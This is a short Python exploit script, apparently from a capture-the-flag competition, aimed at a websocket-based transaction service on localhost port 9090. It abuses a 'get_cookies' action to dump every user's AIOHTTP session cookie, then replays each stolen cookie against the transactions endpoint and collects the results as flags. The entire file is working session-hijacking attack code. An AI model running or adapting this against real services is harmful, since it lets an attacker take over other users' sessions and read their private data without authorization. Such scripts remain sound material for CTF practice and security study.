#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import json
from websocket import create_connection
import requests

def parse_cookies(cookies):
    result=[]
    for i in cookies['Response']['cookies']:
        result.append(i.split('AIOHTTP_SESSION_')[1])
    return result

def parse_result(raw_result):
    result=[]
    for i in raw_result['transactions']:
        result.append(i['msg'])
    return result

#ip = sys.argv[1]
ip = '127.0.0.1' + ':9090'
url = 'ws://{}/api/ws'.format(ip)
cookies = {'AIOHTTP_SESSION' : 'fbd4bf4e8e4f4467a1038cb65a13ada0'}

ws = create_connection(url, timeout=5, cookies=cookies)
ws.recv()

data = json.dumps({'action': 'get_cookies', 'data': '*'})
ws.send(data)

all_cookies = json.loads(ws.recv())

p_cookies = parse_cookies(all_cookies)

result = []

for c in p_cookies:
    cookie = {'AIOHTTP_SESSION' : c}
   
    res = requests.get('http://localhost:9090/api/get_transactions', cookies=cookie)

    if res.status_code != 200:
        print("Haven't transactions yet, user - " + c)
    else:
        for i in parse_result(res.json()):
            result.append(i)


print("FLAGS:")
print(result)